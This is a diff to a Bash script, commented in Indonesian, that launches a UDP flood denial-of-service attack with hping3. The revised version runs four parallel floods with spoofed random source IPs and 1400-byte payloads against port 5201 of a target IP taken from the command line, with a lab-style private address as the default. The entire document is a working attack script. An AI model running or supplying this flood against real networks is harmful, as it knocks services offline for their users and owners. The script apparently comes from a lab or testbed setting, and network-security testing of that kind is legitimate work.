@@ -1,24 +1,15 @@
 #!/bin/bash
 # Serangan UDP Flood menggunakan hping3
-# Script ini mengirim UDP flood dengan source IP random ke port random untuk konsumsi bandwidth
-# 
-# Penggunaan:
-#   sudo ./attack_udp.sh [TARGET_IP]
-#   
-# Jika TARGET_IP tidak diberikan, default adalah 192.168.18.20
-# Tekan Ctrl+C untuk berhenti
+# Jalankan dengan: sudo ./attack_udp.sh [TARGET_IP]
 
-# Default target IP
 TARGET_IP="${1:-192.168.18.20}"
 
 echo "=========================================="
 echo "   UDP FLOOD ATTACK"
 echo "=========================================="
 echo "Target: $TARGET_IP"
-echo "Mode: UDP flood dengan random source IP dan random destination port"
-echo "Tujuan: Konsumsi bandwidth"
-echo ""
-echo "Tekan Ctrl+C untuk menghentikan serangan"
+echo "Mode: UDP flood ke port 5201 (iperf3)"
+echo "Payload: 1400 bytes per packet"
 echo "=========================================="
 echo ""
 
@@ -36,6 +27,17 @@ if [ "$EUID" -ne 0 ]; then
     exit 1
 fi
 
-# Jalankan serangan
-echo "Memulai UDP flood..."
-hping3 --udp --flood --rand-source -p 5201 192.168.18.20 "$TARGET_IP"
+echo "Memulai UDP flood... Tekan Ctrl+C untuk berhenti."
+sleep 1
+
+# LAUNCH 4 parallel hping3 to maximize throughput
+for i in {1..4}; do
+    hping3 --udp --flood --rand-source -p 5201 --data 1400 $TARGET_IP > /dev/null 2>&1 &
+    PIDS+=($!)
+done
+
+# Trap CTRL+C for clean exit
+trap "for pid in \${PIDS[@]}; do kill \$pid 2>/dev/null; done; echo; echo 'Serangan dihentikan.'; exit 0" INT
+
+# Infinite loop to keep script alive
+while true; do sleep 1; done
